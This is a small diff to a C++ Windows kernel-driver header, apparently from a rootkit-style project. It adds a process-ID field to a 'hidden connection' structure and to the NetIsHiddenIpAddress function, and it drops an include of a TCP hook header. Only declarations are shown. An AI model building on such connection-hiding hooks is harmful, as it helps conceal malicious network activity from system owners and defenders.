@@ -1,7 +1,6 @@
 #pragma once
 #include "Ip2string.h"
 #include "NetNSIHook.h"
-#include "NetTCPHook.h"
 
 #ifndef TAG_NET
 #define TAG_NET 'TNET' 
@@ -13,6 +12,7 @@ namespace NetHook
 		ULONG IpAddress;
 		USHORT Port;
 		ULONG RemoteIpAddress;
+		ULONG ConnectPID;
 		USHORT _Unknown;    // For Future Use
 	} NETHOOK_HIDDEN_CONNECTION, * PNETHOOK_HIDDEN_CONNECTION;
 
@@ -30,6 +30,6 @@ namespace NetHook
 
 	VOID UnHookNetworkProxy();
 
-	BOOLEAN NetIsHiddenIpAddress(ULONG IpAddress, USHORT PortNumber, ULONG RemoteIpAddress);
+	BOOLEAN NetIsHiddenIpAddress(ULONG IpAddress, USHORT PortNumber, ULONG RemoteIpAddress, ULONG ConnectPID);
 }
 
